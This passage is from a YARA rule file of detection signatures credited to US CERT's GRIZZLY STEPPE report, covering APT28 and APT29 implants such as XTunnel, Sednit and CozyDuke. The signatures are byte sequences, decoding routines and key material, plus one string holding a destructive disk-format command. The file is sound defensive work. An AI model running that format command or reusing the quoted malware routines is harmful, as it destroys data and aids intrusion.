$ ={0BE7A75A}
$ ={F37443C5}
$ ={A2A474BB}
$ ={97DEEC67}
$ ={7E0CB078}
$ ={9C9678BF}
$ ={4A37A149}
$ ={8667416B}
$ ={0A375BA4}
$ ={DC505A8D}
$ ={02F1F808}
$ ={2C819712}
condition:
uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550 and 15 of them
}
rule SSC_IMPLANT_4_v11 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$ = "/c format %c: /Y /X /FS:NTFS"
$ = ".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf" wide
$ = ".dll.exe.xml.ttf.nfo.fon.ini.cfg.boot.jar" wide
$= ".crt.bin.exe.db.dbf.pdf.djvu.doc.docx.xls.xlsx.jar.ppt.pptx.tib.vhd.iso.lib.mdb.accdb.sql.mdf.xml.rtf.ini.cf g.boot.txt.rar.msi.zip.jpg.bmp.jpeg.tiff" wide
$tempfilename = "%ls_%ls_%ls_%d.~tmp" ascii wide
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them
}
rule SSC_IMPLANT_4_v12 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$CMP1 = {81 ?? 4D 5A 00 00 }
$SUB1 = {81 ?? 00 10 00 00}
$CMP2 = {66 81 38 4D 5A}
$SUB2 = {2D 00 10 00 00}
$HAL = "HAL.dll"
$OUT = {E6 64 E9 ?? ?? FF FF}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and ($CMP1 or $CMP2)
and ($SUB1 or $SUB2) and $OUT and $HAL
}
rule SSC_IMPLANT_4_v13 {
meta:
description = "BlackEnergy / Voodoo Bear Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$XMLDOM1 = {81 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}
$XMLDOM2 = {90 BF 33 29 36 7B D2 11 B2 0E 00 C0 4F 98 3E 60}
$XMLPARSE = {8B 06 [0-2] 8D 55 ?C 52 FF 75 08 [0-2] 50 FF 91 04 01 00 00
66 83 7D ?C FF 75 3? 8B 06 [0-2] 8D 55 F? 52 50 [0-2] FF 51 30 85 C0
78 2?}
$EXP1 = "DispatchCommand"
$EXP2 = "DispatchEvent"
$BDATA = {85 C0 74 1? 0F B7 4? 06 83 C? 28 [0-6] 72 ?? 33 C0 5F 5E 5B 5D
C2 08 00 8B 4? 0? 8B 4? 0? 89 01 8B 4? 0C 03 [0-2] EB E?}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_5_v1 {
meta:
description = "XTunnel Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$hexstr = {2D 00 53 00 69 00 00 00 2D 00 53 00 70 00 00 00 2D 00 55 00
70 00 00 00 2D 00 50 00 69 00 00 00 2D 00 50 00 70 00 00 00}
$UDPMSG1 = "error 2005 recv from server UDP - %d\x0a"
$TPSMSG1 = "error 2004 send to TPS - %d\x0a"
$TPSMSG2 = "error 2003 recv from TPS - %d\x0a"
$UDPMSG2 = "error 2002 send to server UDP - %d\x0a"
condition:
any of them
}
rule SSC_IMPLANT_5_v2 {
meta:
description = "XTunnel Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$key0 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }
$key1 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }
$key2 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }
$key3 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }
$key4 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }
$key5 = { 34F1AE17017AF16021ADA5CE3F77675BBC6E7DEC6478D6078A0B22E5FDFF3B31 }
$key6 = { F0EA48F164395186E6F754256EBB812A2AFE168E77ED9501F8B8E6F5B72126A7 }
$key7 = { 0B6E9970A8EAF68EE14AB45005357A2F3391BEAA7E53AB760B916BC2B3916ABE }
$key8 = { FF032EA7ED2436CF6EEA1F741F99A3522A61FDA8B5A81EC03A8983ED1AEDAB1A }
$key9 = { F0DAC1DDFEF7AC6DE1CBE1006584538FE650389BF8565B32E0DE1FFACBCB14BB }
$key10 = { A5D699A3CD4510AF11F1AF767602055C523DF74B94527D74319D6EFC6883B80D }
$key11 = { 5951B02696C1D5A7B2851D28872384DA607B25F4CEA268FF3FD7FBA75AB3B4B3 }
$key12 = { 0465D99B26AF42D8346001BB838595E301BAD8CF5D40CE9C17C944717DF82481 }
$key13 = { 5DFE1C83AD5F5CE1BF5D9C42E23225E3ECFDB2493E80E6554A2AC7C722EB4880 }
$key14 = { E9650396C45F7783BC14C59F46EA8232E8357C26B5627BFF8C42C6AE2E0F2E17 }
$key15 = { 7432AE389125BB4E3980ED7F6A6FB252A42E785A90F4591C3620CA642FF97CA3 }
$key16 = { 2B2ADBBC4F960A8916F7088067BAD30BE84B65783FBF9476DF5FDA0E5856B183 }
$key17 = { 808C3FD0224A59384161B8A81C8BB404D7197D16D8118CB77067C5C8BD764B3E }
$key18 = { 028B0E24D5675C16C815BFE4A073E9778C668E65771A1CE881E2B03F58FC7D5B }
$key19 = { 878B7F5CF2DC72BAF1319F91A4880931EE979665B1B24D3394FE72EDFAEF4881 }
$key20 = { 7AC7DD6CA34F269481C526254D2F563BC6ECA1779FEEAA33EC1C20E60B686785 }
$key21 = { 3044F1D394186815DD8E3A2BBD9166837D07FA1CF6A550E2C170C9CDD9305209 }
$key22 = { 7544DC095C441E39D258648FE9CB1267D20D83C8B2D3AB734474401DA4932619 }
$key23 = { D702223347406C1999D1A9829CBBE96EC86D377A40E2EE84562EA1FAC1C71498 }
$key24 = { CA36CB1177382A1009D392A58F7C1357E94AD2292CC0AE82EE4F7DB0179148E1 }
$key25 = { C714F23E4C1C4E55F0E1FA7F5D0DD64658A86F84681D07576D840784154F65DC }
$key26 = { 63571BAF736904634AFEE2A70CB9ED64615DE8CA7AEF21E773286B8877D065DB }
$key27 = { 27808A9BE98FFE348DE1DB999AC9FDFB26E6C5A0D5E688490EF3D186C43661EB }
$key28 = { B6EB86A07A85D40866AFA100789FFB9E85C13F5AA7C7A3B6BA753C7EAB9D6A62 }
$key29 = { 88F0020375D60BDB85ACDBFE4BD79CD098DB2B3FA2CEF55D4331DBEFCE455157 }
$key30 = { 36535AAB296587AE1162AC5D39492DD1245811C72706246A38FF590645AA5D7B }
$key31 = { FDB726261CADD52E10818B49CAB81BEF112CB63832DAA26AD9FC711EA6CE99A4 }
$key32 = { 86C0CAA26D9FD07D215BC7EB14E2DA250E905D406AFFAB44FB1C62A2EAFC4670 }
$key33 = { BC101329B0E3A7D13F6EBC535097785E27D59E92D449D6D06538725034B8C0F0 }
$key34 = { C8D31A78B7C149F62F06497F9DC1DDC4967B566AC52C3A2A65AC7A99643B8A2D }
$key35 = { 0EA4A5C565EFBB94F5041392C5F0565B6BADC630D9005B3EADD5D81110623E1F }
$key36 = { 06E4E46BD3A0FFC8A4125A6A02B0C56D5D8B9E378CF97539CE4D4ADFAF89FEB5 }
$key37 = { 6DE22040821F0827316291331256A170E23FA76E381CA7066AF1E5197AE3CFE7 }
$key38 = { C6EF27480F2F6F40910074A45715143954BBA78CD74E92413F785BBA5B2AA121 }
$key39 = { 19C96A28F8D9698ADADD2E31F2426A46FD11D2D45F64169EDC7158389BFA59B4 }
$key40 = { C3C3DDBB9D4645772373A815B5125BB2232D8782919D206E0E79A6A973FF5D36 }
$key41 = { C33AF1608037D7A3AA7FB860911312B4409936D236564044CFE6ED42E54B78A8 }
$key42 = { 856A0806A1DFA94B5E62ABEF75BEA3B657D9888E30C8D2FFAEC042930BBA3C90 }
$key43 = { 244496C524401182A2BC72177A15CDD2EF55601F1D321ECBF2605FFD1B9B8E3F }
$key44 = { DF24050364168606D2F81E4D0DEB1FFC417F1B5EB13A2AA49A89A1B5242FF503 }
$key45 = { 54FA07B8108DBFE285DD2F92C84E8F09CDAA687FE492237F1BC4343FF4294248 }
$key46 = { 23490033D6BF165B9C45EE65947D6E6127D6E00C68038B83C8BFC2BCE905040C }
$key47 = { 4E044025C45680609B6EC52FEB3491130A711F7375AAF63D69B9F952BEFD5F0C }
$key48 = { 019F31C5F5B2269020EBC00C1F511F2AC23E9D37E89374514C6DA40A6A03176C }
$key49 = { A2483197FA57271B43E7276238468CFB8429326CBDA7BD091461147F642BEB06 }
$key50 = { 731C9D6E74C589B7ACB019E5F6A6E07ACF12E68CB9A396CE05AA4D69D5387048 }
$key51 = { 540DB6C8D23F7F7FEF9964E53F445F0E56459B10E931DEEEDB2B57B063C7F8B7 }
$key52 = { D5AF80A7EEFF26DE988AC3D7CE23E62568813551B2133F8D3E973DA15E355833 }
$key53 = { E4D8DBD3D801B1708C74485A972E7F00AFB45161C791EE05282BA68660FFBA45 }
$key54 = { D79518AF96C920223D687DD596FCD545B126A678B7947EDFBF24661F232064FB }
$key55 = { B57CAA4B45CA6E8332EB58C8E72D0D9853B3110B478FEA06B35026D7708AD225 }
$key56 = { 077C714C47DFCF79CA2742B1544F4AA8035BB34AEA9D519DEE77745E01468408 }
$key57 = { C3F5550AD424839E4CC54FA015994818F4FB62DE99B37C872AF0E52C376934FA }
$key58 = { 5E890432AE87D0FA4D209A62B9E37AAEDEDC8C779008FEBAF9E4E6304D1B2AAC }
$key59 = { A42EDE52B5AF4C02CFE76488CADE36A8BBC3204BCB1E05C402ECF450071EFCAB }
$key60 = { 4CDAFE02894A04583169E1FB4717A402DAC44DA6E2536AE53F5F35467D31F1CA }
$key61 = { 0BEFCC953AD0ED6B39CE6781E60B83C0CFD166B124D1966330CBA9ADFC9A7708 }
$key62 = { 8A439DC4148A2F4D5996CE3FA152FF702366224737B8AA6784531480ED8C8877 }
$key63 = { CF253BE3B06B310901FF48A351471374AD35BBE4EE654B72B860F2A6EC7B1DBB }
$key64 = { A0599F50C4D059C5CFA16821E97C9596B1517B9FB6C6116F260415127F32CE1F }
$key65 = { 8B6D704F3DC9150C6B7D2D54F9C3EAAB14654ACA2C5C3952604E65DF8133FE0C }
$key66 = { A06E5CDD3871E9A3EE17F7E8DAE193EE47DDB87339F2C599402A78C15D77CEFD }
$key67 = { E52ADA1D9BC4C089DBB771B59904A3E0E25B531B4D18B58E432D4FA0A41D9E8A }
$key68 = { 4778A7E23C686C171FDDCCB8E26F98C4CBEBDF180494A647C2F6E7661385F05B }
$key69 = { FE983D3A00A9521F871ED8698E702D595C0C7160A118A7630E8EC92114BA7C12 }
$key70 = { 52BA4C52639E71EABD49534BBA80A4168D15762E2D1D913BAB5A5DBF14D9D166 }
$key71 = { 931EB8F7BC2AE1797335C42DB56843427EB970ABD601E7825C4441701D13D7B1 }
$key72 = { 318FA8EDB989672DBE2B5A74949EB6125727BD2E28A4B084E8F1F50604CCB735 }
$key73 = { 5B5F2315E88A42A7B59C1B493AD15B92F819C021BD70A5A6619AAC6666639BC2 }
$key74 = { C2BED7AA481951FEB56C47F03EA38236BC425779B2FD1F1397CB79FE2E15C0F0 }
$key75 = { D3979B1CB0EC1A655961559704D7CDC019253ACB2259DFB92558B7536D774441 }
$key76 = { 0EDF5DBECB772424D879BBDD51899D6AAED736D0311589566D41A9DBB8ED1CC7 }
$key77 = { CC798598F0A9BCC82378A5740143DEAF1A147F4B2908A197494B7202388EC905 }
$key78 = { 074E9DF7F859BF1BD1658FD2A86D81C282000EAB09AF4252FAB45433421D3849 }
$key79 = { 6CD540642E007F00650ED20D7B54CFFD54DDA95D8DEBB087A004BAE222F22C8E }
$key80 = { C76CF2F66C71F6D17FC8DEFA1CAEF8718BA1CE188C7EA02C835A0FA54D3B3314 }
$key81 = { A7250A149600E515C9C40FE5720756FDA8251635A3B661261070CB5DABFE7253 }
$key82 = { 237C67B97D4CCE4610DE2B82E582808EA796C34A4C24715C953CBA403B2C935E }
$key83 = { A8FA182547E66B57C497DAAA195A38C0F0FB0A3C1F7B98B4B852F5F37E885127 }
$key84 = { 83694CCA50B821144FFBBE6855F62845F1328111AE1AC5666CBA59EB43AA12C6 }
$key85 = { 145E906416B17865AD37CD022DF5481F28C930D6E3F53C50B0953BF33F4DB953 }
$key86 = { AB49B7C2FA3027A767F5AA94EAF2B312BBE3E89FD924EF89B92A7CF977354C22 }
$key87 = { 7E04E478340C209B01CA2FEBBCE3FE77C6E6169F0B0528C42FA4BDA6D90AC957 }
$key88 = { 0EADD042B9F0DDBABA0CA676EFA4EDB68A045595097E5A392217DFFC21A8532F }
$key89 = { 5623710F134ECACD5B70434A1431009E3556343ED48E77F6A557F2C7FF46F655 }
$key90 = { 6968657DB62F4A119F8E5CB3BF5C51F4B285328613AA7DB9016F8000B576561F }
$key91 = { DEBB9C95EAE6A68974023C335F8D2711135A98260415DF05845F053AD65B59B4 }
$key92 = { 16F54900DBF08950F2C5835153AB636605FB8C09106C0E94CB13CEA16F275685 }
$key93 = { 1C9F86F88F0F4882D5CBD32876368E7B311A84418692D652A6A4F315CC499AE8 }
$key94 = { E920E0783028FA05F4CE2D6A04BBE636D56A775CFD4DAEA3F2A1B8BEEB52A6D4 }
$key95 = { 73874CA3AF47A8A315D50E1990F44F655EC7C15B146FFE0611B6C4FC096BD07C }
$key96 = { F21C1FA163C745789C53922C47E191A5A85301BDC2FFC3D3B688CFBFF39F3BE5 }
$key97 = { BC5A861F21CB98BD1E2AE9650B7A0BB4CD0C71900B3463C1BC3380AFD2BB948E }
$key98 = { 151BAE36E646F30570DC6A7B57752F2481A0B48DD5184E914BCF411D8AD5ACA0 }
$key99 = { F05AD6D7A0CADC10A6468BFDBCBB223D5BD6CA30EE19C239E8035772D80312C9 }
$key100 = { 5DE9A0FDB37C0D59C298577E5379BCAF4F86DF3E9FA17787A4CEFA7DD10C462E }
$key101 = { F5E62BA862380224D159A324D25FD321E5B35F8554D70CF9A506767713BCA508 }
$key102 = { A2D1B10409B328DA0CCBFFDE2AD2FF10855F95DA36A1D3DBA84952BB05F8C3A7 }
$key103 = { C974ABD227D3AD339FAC11C97E11D904706EDEA610B181B8FAD473FFCC36A695 }
$key104 = { AB5167D2241406C3C0178D3F28664398D5213EE5D2C09DCC9410CB604671F5F1 }
$key105 = { C25CC4E671CAAA31E137700A9DB3A272D4E157A6A1F47235043D954BAE8A3C70 }
$key106 = { E6005757CA0189AC38F9B6D5AD584881399F28DA949A0F98D8A4E3862E20F715 }
$key107 = { 204E6CEB4FF59787EF4D5C9CA5A41DDF4445B9D8E0C970B86D543E9C7435B194 }
$key108 = { 831D7FD21316590263B69E095ABBE89E01A176E16AE799D83BD774AF0D254390 }
$key109 = { 42C36355D9BC573D72F546CDB12E6BB2CFE2933AC92C12040386B310ABF6A1ED }
$key110 = { B9044393C09AD03390160041446BF3134D864D16B25F1AB5E5CDC690C4677E7D }
$key111 = { 6BC1102B5BE05EEBF65E2C3ACA1F4E17A59B2E57FB480DE016D371DA3AEF57A5 }
$key112 = { B068D00B482FF73F8D23795743C76FE8639D405EE54D3EFB20AFD55A9E2DFF4E }
$key113 = { 95CF5ADDFE511C8C7496E3B75D52A0C0EFE01ED52D5DD04D0CA6A7ABD3A6F968 }
$key114 = { 75534574A4620019F8E3D055367016255034FA7D91CBCA9E717149441742AC8D }
$key115 = { 96F1013A5301534BE424A11A94B740E5EB3A627D052D1B769E64BAB6A666433C }
$key116 = { 584477AB45CAF729EE9844834F84683ABECAB7C4F7D23A9636F54CDD5B8F19B3 }
$key117 = { D3905F185B564149EE85CC3D093477C8FF2F8CF601C68C38BBD81517672ECA3A }
$key118 = { BF29521A7F94636D1930AA236422EB6351775A523DE68AF9BF9F1026CEDA618D }
$key119 = { 04B3A783470AF1613A9B849FBD6F020EE65C612343EB1C028B2C28590789E60B }
$key120 = { 3D8D8E84977FE5D21B6971D8D873E7BED048E21333FE15BE2B3D1732C7FD3D04 }
$key121 = { 8ACB88224B6EF466D7653EB0D8256EA86D50BBA14FD05F7A0E77ACD574E9D9FF }
$key122 = { B46121FFCF1565A77AA45752C9C5FB3716B6D8658737DF95AE8B6A2374432228 }
$key123 = { A4432874588D1BD2317224FB371F324DD60AB25D4191F2F01C5C13909F35B943 }
$key124 = { 78E1B7D06ED2A2A044C69B7CE6CDC9BCD77C19180D0B082A671BBA06507349C8 }
$key125 = { 540198C3D33A631801FE94E7CB5DA3A2D9BCBAE7C7C3112EDECB342F3F7DF793 }
$key126 = { 7E905652CAB96ACBB7FEB2825B55243511DF1CD8A22D0680F83AAF37B8A7CB36 }
$key127 = { 37218801DBF2CD92F07F154CD53981E6189DBFBACAC53BC200EAFAB891C5EEC8 }
condition:
any of them
}
rule SSC_IMPLANT_5_v3 {
meta:
description = "XTunnel Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$BYTES1 = { 0F AF C0 6? C0 07 00 00 00 2D 01 00 00 00 0F AF ?? 39 ?8 }
$BYTES2 = { 0F AF C0 6? C0 07 48 0F AF ?? 39 ?8 }
condition:
any of them
}
rule SSC_IMPLANT_5_v4 {
meta:
description = "XTunnel Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$FBKEY1 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }
$FBKEY2 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }
$FBKEY3 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }
$FBKEY4 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }
$FBKEY5 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }
condition:
all of them
}
rule SSC_IMPLANT_6_v1
{
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = "dll.dll" wide ascii
$STR2 = "Init1" wide ascii
$STR3 = "netui.dll" wide ascii
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v2 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$obf_func = { 8B 45 F8 6A 07 03 C7 33 D2 89 45 E8 8D 47 01 5B 02 4D 0F F7 F3 6A 07 8A 04 32 33 D2 F6 E9 8A C8 8B C7 F7 F3 8A 44 3E FE 02 45 FC 02 0C 32 B2 03 F6 EA 8A D8 8D 47 FF 33 D2 5F F7 F7 02 5D 14 8B 45 E8 8B 7D F4 C0 E3 06 02 1C 32 32 CB 30 08 8B 4D 14 41 47 83 FF 09 89 4D 14 89 7D F4 72 A1 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v3 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$deob_func = { 8D 46 01 02 D1 83 E0 07 8A 04 38 F6 EA 8B D6 83 E2 07 0A
04 3A 33 D2 8A 54 37 FE 03 D3 03 D1 D3 EA 32 C2 8D 56 FF 83 E2 07 8A
1C 3A 8A 14 2E 32 C3 32 D0 41 88 14 2E 46 83 FE 0A 7C ?? }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v4 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$ASM = {53 5? 5? [6-15] ff d? 8b ?? b? a0 86 01 00 [7-13] ff d? ?b
[6-10] c0 [0-1] c3}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v5 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 83 EC 18 8B 4C 24 24 B8 AB AA AA AA F7 E1 8B 44 24 20 53 55 8B
EA 8D 14 08 B8 AB AA AA AA 89 54 24 1C F7 E2 56 8B F2 C1 ED 02 8B DD
57 8B 7C 24 38 89 6C 24 1C C1 EE 02 3B DE 89 5C 24 18 89 74 24 20 0F
83 CF 00 00 00 8D 14 5B 8D 44 12 FE 89 44 24 10 3B DD 0F 85 CF 00 00
00 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA 83 F9 06 89 4C 24 38 0F 83
86 00 00 00 8A C3 B2 06 F6 EA 8B 54 24 10 88 44 24 30 8B 44 24 2C 8D
71 02 03 D0 89 54 24 14 8B 54 24 10 33 C0 8A 44 37 FE 03 D6 8B D8 8D
46 FF 0F AF DA 33 D2 BD 06 00 00 00 F7 F5 C1 EB 07 8A 04 3A 33 D2 32
D8 8D 46 01 F7 F5 8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5
8A 04 3A 22 C8 8B 44 24 14 02 D9 8A 0C 30 32 CB 88 0C 30 8B 4C 24 38
41 46 83 FE 08 89 4C 24 38 72 A1 8B 5C 24 18 8B 6C 24 1C 8B 74 24 20
8B 4C 24 10 43 83 C1 06 3B DE 89 4C 24 10 8B 4C 24 34 89 5C 24 18 0F
82 3C FF FF FF 3B DD 75 1A 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B CA EB
0D 33 C9 89 4C 24 38 E9 40 FF FF FF 33 C9 8B 44 24 24 33 D2 BE 06 00
00 00 89 4C 24 38 F7 F6 3B CA 89 54 24 24 0F 83 95 00 00 00 8A C3 B2
06 F6 EA 8D 1C 5B 88 44 24 30 8B 44 24 2C 8D 71 02 D1 E3 89 5C 24 34
8D 54 03 FE 89 54 24 14 EB 04 8B 5C 24 34 33 C0 BD 06 00 00 00 8A 44
3E FE 8B D0 8D 44 1E FE 0F AF D0 C1 EA 07 89 54 24 2C 8D 46 FF 33 D2
BB 06 00 00 00 F7 F3 8B 5C 24 2C 8A 04 3A 33 D2 32 D8 8D 46 01 F7 F5
8A 44 24 30 02 C1 8A 0C 3A 33 D2 32 C8 8B C6 F7 F5 8A 04 3A 22 C8 8B
44 24 14 02 D9 8A 0C 06 32 CB 88 0C 06 8B 4C 24 38 8B 44 24 24 41 46
3B C8 89 4C 24 38 72 8F 5F 5E 5D 5B 83 C4 18 C2 10 00 }
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v6 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$Init1_fun = {68 10 27 00 00 FF 15 ?? ?? ?? ?? A1 ?? ?? ?? ?? 6A FF 50
FF 15 ?? ?? ?? ?? 33 C0 C3}
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
}
rule SSC_IMPLANT_6_v7 {
meta:
description = "Sednit / EVILTOSS Implant by APT28"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = "Init1"
$OPT1 = "ServiceMain"
$OPT2 = "netids" nocase wide ascii
$OPT3 = "netui" nocase wide ascii
$OPT4 = "svchost.exe" wide ascii
$OPT5 = "network" nocase wide ascii
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR1 and 2 of ($OPT*)
}
rule SSC_IMPLANT_7_v1 {
meta:
description = "Implant 7 by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 8A 44 0A 03 32 C3 0F B6 C0 66 89 04 4E 41 3B CF 72 EE }
$STR2 = { F3 0F 6F 04 08 66 0F EF C1 F3 0F 7F 04 11 83 C1 10 3B CF 72 EB }
condition:
(uint16(0) == 0x5A4D) and ($STR1 or $STR2)
}
rule SSC_IMPLANT_8_v1
{
meta:
description = "HAMMERTOSS / HammerDuke Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$DOTNET = "mscorlib" ascii
$REF_URL = "https://www.google.com/url?sa=" wide
$REF_var_1 = "&rct=" wide
$REF_var_2 = "&q=&esrc=" wide
$REF_var_3 = "&source=" wide
$REF_var_4 = "&cd=" wide
$REF_var_5 = "&ved=" wide
$REF_var_6 = "&url=" wide
$REF_var_7 = "&ei=" wide
$REF_var_8 = "&usg=" wide
$REF_var_9 = "&bvm=" wide
$REF_value_1 = "QFj" wide
$REF_value_2 = "bv.81" wide
condition:
(uint16(0) == 0x5A4D) and ($DOTNET) and ($REF_URL) and
(3 of ($REF_var*)) and (1 of ($REF_value*))
}
rule SSC_IMPLANT_8_v2 {
meta:
description = "HAMMERTOSS / HammerDuke Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$DOTNET= "mscorlib" ascii
$XOR = {61 20 AA 00 00 00 61}
condition:
(uint16(0) == 0x5A4D) and all of them
}
rule SSC_IMPLANT_9_v1 {
meta:
description = "Onion Duke Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = { 8B 03 8A 54 01 03 32 55 FF 41 88 54 39 FF 3B CE 72 EE }
$STR2 = { 8B C8 83 E1 03 8A 54 19 08 8B 4D 08 32 54 01 04 40 88 54 38 FF
3B C6 72 E7 }
$STR3 = { 8B 55 F8 8B C8 83 E1 03 8A 4C 11 08 8B 55 FC 32 0C 10 8B 17 88
4C 02 04 40 3B 06 72 E3 }
condition:
(uint16(0) == 0x5A4D or uint16(0)) and all of them
}
rule SSC_IMPLANT_10_v1 {
meta:
description = "CozyDuke / CozyCar / CozyBear Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$STR1 = {33 ?? 83 F2 ?? 81 E2 FF 00 00 00}
$STR2 = {0F BE 14 01 33 D0 ?? F2 [1-4] 81 E2 FF 00 00 00 66 89 [6] 40 83
F8 ?? 72}
condition:
uint16(0) == 0x5A4D and ($STR1 or $STR2)
}
rule SSC_IMPLANT_10_v2 {
meta:
description = "CozyDuke / CozyCar / CozyBear Implant by APT29"
author = "US CERT"
reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
date = "2017-02-10"
score = 85
strings:
$xor = { 34 ?? 66 33 C1 48 FF C1 }
$nop = { 66 66 66 66 66 66 0f 1f 84 00 00 00 00 00}
condition:
uint16(0) == 0x5A4D and $xor and $nop
}
